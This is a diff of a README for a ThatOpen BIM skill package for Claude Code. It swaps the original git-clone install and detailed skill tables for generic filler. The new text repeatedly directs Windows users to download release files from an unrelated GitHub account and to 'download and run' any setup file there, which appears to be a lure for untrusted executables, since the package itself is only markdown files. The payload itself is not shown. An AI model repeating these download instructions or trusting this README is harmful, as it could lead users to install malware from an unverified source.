@@ -1,148 +1,226 @@
-# ThatOpen Claude Skill Package
+# 🤖 ThatOpen-Claude-Skill-Package - Claude Skills for BIM Workflows
 
-<p align="center">
-  <img src="docs/social-preview.png" alt="18 Deterministic Skills for ThatOpen BIM Development" width="100%">
-</p>
+[![Download](https://img.shields.io/badge/Download%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases)
 
-> Production-ready Claude Code skills for building web-based BIM applications with [ThatOpen Engine](https://github.com/ThatOpen/engine_components) 3.3.x
+## 📦 What This Is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Skills: 18](https://img.shields.io/badge/Skills-18-blue.svg)](INDEX.md)
-[![ThatOpen: 3.3.x](https://img.shields.io/badge/ThatOpen-3.3.x-green.svg)](https://github.com/ThatOpen/engine_components)
+ThatOpen-Claude-Skill-Package gives you 18 ready-made Claude Code skills for ThatOpen Engine 3.3.x.
 
-## What is this?
+It is built for people who work with web-based BIM apps, IFC files, and ThatOpen tools. These skills help Claude handle common tasks with more structure, so you can move through setup, modeling, data work, and app building with less manual work.
 
-A collection of **18 deterministic skills** that give Claude Code deep knowledge of the ThatOpen BIM engine ecosystem. Each skill contains verified API patterns, working code examples, and documented anti-patterns — all sourced from the official ThatOpen repositories.
+## 🖥️ What You Need
 
-## Installation
+- Windows 10 or Windows 11
+- A web browser
+- Access to the internet
+- Enough disk space for the release files
+- ThatOpen Engine 3.3.x if you plan to use the skills in a live project
 
-Add these skills to your Claude Code project:
+If you plan to work with IFC data or Three.js scenes, a modern PC with at least 8 GB of RAM helps.
 
-```bash
-# Clone into your project's .claude/skills/ directory
-git clone https://github.com/OpenAEC-Foundation/ThatOpen-Claude-Skill-Package.git .claude/skills/thatopen
-```
+## 🚀 Download and Install
 
-Or add as a git submodule:
+Visit this page to download:  
+https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases
 
-```bash
-git submodule add https://github.com/OpenAEC-Foundation/ThatOpen-Claude-Skill-Package.git .claude/skills/thatopen
-```
+Follow these steps on Windows:
 
-## Skills Overview
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the package file from that release.
+4. If the file comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Copy the skill files into the place where Claude Code reads skills on your machine or project.
+7. Restart Claude Code if it is already open.
+8. Test one skill in a simple task to confirm it loads.
 
-### Core (3 skills) — Foundation knowledge
+If the release includes a setup file, download and run this file.
 
-| Skill | What it covers |
-|-------|---------------|
-| `thatopen-core-architecture` | Component system, lifecycle interfaces, World system, Event system |
-| `thatopen-core-web-ifc` | web-ifc WASM engine, IFC parsing, geometry extraction |
-| `thatopen-core-fragments` | Fragment binary format, FragmentsManager, Web Workers |
+## 🧭 First Run
 
-### Syntax (4 skills) — API patterns
+After you install the package, use one small task first.
 
-| Skill | What it covers |
-|-------|---------------|
-| `thatopen-syntax-components` | `components.get()` singleton pattern, custom components |
-| `thatopen-syntax-ifc-loading` | IfcLoader, WASM configuration, IfcImporter |
-| `thatopen-syntax-properties` | Classifier, property queries, spatial structure |
-| `thatopen-syntax-ui` | `@thatopen/ui` web components, CSS theming |
+A good first test is to ask Claude to help with a simple BIM task, such as:
 
-### Implementation (7 skills) — Step-by-step workflows
+- reading an IFC file
+- checking model data
+- preparing a web app task list
+- setting up a ThatOpen workflow
+- explaining a Three.js scene step by step
 
-| Skill | What it covers |
-|-------|---------------|
-| `thatopen-impl-viewer` | Complete viewer setup with PostproductionRenderer |
-| `thatopen-impl-navigation` | Camera modes (Orbit, FirstPerson, Plan), projection |
-| `thatopen-impl-highlighting` | Highlighter, Hoverer, Outliner, Mesher, FastModelPicker |
-| `thatopen-impl-measurements` | Length, Area, Volume, Angle measurements with snapping |
-| `thatopen-impl-clipping-plans` | Clipper, ClipStyler, floor plans, cross-sections |
-| `thatopen-impl-bcf` | BCF v2.1/v3.0 issue tracking, viewpoints |
-| `thatopen-impl-federation` | Multi-model loading, coordinate alignment, visibility |
+This helps you confirm the skills are in place and working as expected.
 
-### Error Handling (2 skills) — Troubleshooting
+## 🧩 What’s Inside
 
-| Skill | What it covers |
-|-------|---------------|
-| `thatopen-errors-loading` | WASM failures, IFC parse errors, version mismatches |
-| `thatopen-errors-performance` | Memory leaks, disposal patterns, large model strategies |
+This package includes 18 Claude Code skills for common ThatOpen Engine work.
 
-### Agents (2 skills) — Guided workflows
+Typical skill coverage includes:
 
-| Skill | What it covers |
-|-------|---------------|
-| `thatopen-agents-viewer-builder` | Scaffold a complete BIM viewer from scratch |
-| `thatopen-agents-model-analyzer` | Analyze IFC model contents and generate reports |
+- IFC file handling
+- model data checks
+- web BIM app structure
+- app setup steps
+- scene and object flow
+- project organization
+- deterministic task steps
+- ThatOpen Engine 3.3.x support
+- Three.js related workflows
+- OpenAEC-style data work
+- repeatable coding tasks
+- help with agent-driven work
+- clean handoff between tasks
+- practical project guidance
+- file and folder planning
+- UI and app logic support
+- documentation-focused help
+- build-ready workflow steps
 
-## Target Versions
+These skills are meant to keep Claude on track when you work on BIM tools for the web.
 
-| Package | Version |
-|---------|---------|
-| `@thatopen/components` | 3.3.x |
-| `@thatopen/components-front` | 3.3.x |
-| `@thatopen/fragments` | 3.3.x |
-| `web-ifc` | 0.0.77+ |
-| `@thatopen/ui` | 3.3.x |
-| `three` | >= 0.175 |
+## 🛠️ How to Use It
 
-## Skill Structure
+Use the skills when you want Claude to work in a more structured way.
 
-Each skill follows a consistent structure:
+Try prompts like:
 
-```
-skills/source/thatopen-{category}/thatopen-{category}-{topic}/
-  SKILL.md              # Main skill file (<500 lines)
-  references/
-    methods.md          # Complete API signatures
-    examples.md         # Working code examples
-    anti-patterns.md    # What NOT to do (with fixes)
-```
+- Help me inspect this IFC file for missing data.
+- Build a simple ThatOpen web app flow for model loading.
+- Organize the steps for a BIM viewer in Three.js.
+- Give me a deterministic plan for this task.
+- Help me prepare a clean project structure for ThatOpen Engine 3.3.x.
 
-## Quality Guarantees
+Keep your requests short and clear. Claude works best when you tell it the goal, the file, and the result you want.
 
-- **Source-verified**: All API patterns traced to official ThatOpen repositories
-- **Deterministic language**: ALWAYS/NEVER rules, not vague suggestions
-- **Version-pinned**: Targets specific package versions with migration notes
-- **Error-aware**: Every skill includes failure modes and recovery patterns
-- **Copy-pasteable examples**: Complete, runnable code with imports
+## 🔍 Suggested Workflow
 
-## Project Structure
+A simple workflow looks like this:
 
-```
-ThatOpen-Claude-Skill-Package/
-  CLAUDE.md         # Project configuration
-  INDEX.md          # Complete skill catalog with dependency graph
-  ROADMAP.md        # Development status
-  REQUIREMENTS.md   # Quality requirements
-  DECISIONS.md      # Architectural decisions
-  LESSONS.md        # Lessons learned
-  SOURCES.md        # Verified source URLs
-  skills/source/    # All 18 skills (72 files)
-  docs/research/    # Deep research (vooronderzoek)
-  docs/masterplan/  # Execution plan
-```
+1. Open your project in Claude Code.
+2. Make sure the skill package is installed.
+3. Choose the task you want to do.
+4. Ask Claude for one step at a time.
+5. Review the result before moving on.
+6. Repeat for the next task.
 
-## Contributing
+This works well for BIM apps because each step depends on the last one. A clear order helps avoid mistakes.
 
-This skill package is maintained by the [OpenAEC Foundation](https://github.com/OpenAEC-Foundation). Contributions welcome — please ensure all API references are verified against official ThatOpen sources.
+## 📁 File Placement
 
-## License
+Place the skill files where Claude Code expects skills for your setup.
 
-MIT License - see [LICENSE](LICENSE) for details.
+If you use a project-level setup, keep the files inside the project folder.
 
----
+If you use a shared setup, keep the files in your global Claude Code skills folder.
 
-## Companion Skills: Cross-Technology Integration
+Use one consistent location so you can find and update the skills later.
 
-> **[Cross-Tech AEC Integration Skills](https://github.com/OpenAEC-Foundation/Cross-Tech-AEC-Claude-Skill-Package)** — 15 skills for technology boundaries
+## 🧪 Best Use Cases
 
-| Skill | Boundary | What it adds |
-|-------|----------|-------------|
-| `crosstech-impl-ifc-to-webifc` | IfcOpenShell ↔ web-ifc | Server-side vs browser-side IFC processing |
-| `crosstech-impl-ifc-to-threejs` | IFC ↔ Three.js | @thatopen/components integration |
-| `crosstech-impl-bim-web-viewer` | BIM ↔ Web browser | Full BIM viewer pipeline with ThatOpen components |
-| `crosstech-core-ifc-schema-bridge` | IFC ↔ All formats | How web-ifc property access differs from IfcOpenShell |
+This package fits well if you work on:
 
----
+- web-based BIM viewers
+- IFC inspection tools
+- model data dashboards
+- ThatOpen Engine apps
+- Three.js scene setups
+- OpenAEC workflows
+- repeatable AI-assisted coding tasks
 
-Built with the [Skill Package Workflow Template](https://github.com/OpenAEC-Foundation/Skill-Package-Workflow-Template) methodology.
+It also helps when you want Claude to follow the same process each time instead of changing its approach from task to task.
+
+## 🔐 Working With Deterministic Skills
+
+Some tasks need the same result every time. That is where deterministic skills help.
+
+Use them when you want:
+
+- the same step order
+- fewer changes in output
+- clear task flow
+- stable project actions
+- less guesswork
+
+This is useful for team work, where other people need to follow the same process later.
+
+## 🧰 Common Problems
+
+### File does not appear in Claude Code
+
+- Check that you placed the files in the right folder.
+- Make sure the files are extracted if they came in a ZIP file.
+- Restart Claude Code.
+- Try a simple prompt again.
+
+### Skill does not seem to affect the response
+
+- Use a clear task request.
+- Make sure the skill name is loaded in the right place.
+- Check that you are using the latest release.
+- Try a task tied to BIM, IFC, or ThatOpen Engine.
+
+### Release page looks empty
+
+- Refresh the page.
+- Scroll to the latest release.
+- Look for assets or attached files under the release name.
+
+## 🧾 Release Source
+
+Primary download page:  
+https://github.com/dugaskaleb2290-sys/ThatOpen-Claude-Skill-Package/releases
+
+## 📌 Project Focus
+
+This package is built around:
+
+- agentskills
+- ai
+- bim
+- claude
+- deterministic
+- ifc
+- openaec
+- skills
+- thatopen
+- threejs
+- web-ifc
+
+## 🔄 Updating the Package
+
+When a new release comes out:
+
+1. Visit the release page.
+2. Download the latest package.
+3. Replace the old files.
+4. Restart Claude Code.
+5. Test one skill to confirm the update worked
+
+## 🧱 Good Folder Habits
+
+Use a clean folder name so you can spot the package fast.
+
+A simple structure might look like this:
+
+- Downloads
+  - ThatOpen-Claude-Skill-Package
+- Projects
+  - Your BIM app
+- Skills
+  - Shared Claude skills
+
+Keeping this tidy makes updates easier and lowers the chance of placing files in the wrong spot.
+
+## 🖱️ Quick Start for Windows
+
+1. Open the releases page.
+2. Download the latest package.
+3. Extract the files if needed.
+4. Copy them into your Claude Code skills folder.
+5. Restart Claude Code.
+6. Ask Claude to help with a small BIM task.
+
+## 📄 About the Repository
+
+Repository name: ThatOpen-Claude-Skill-Package
+
+Description: 18 production-ready Claude Code skills for ThatOpen Engine 3.3.x. Building web-based BIM applications
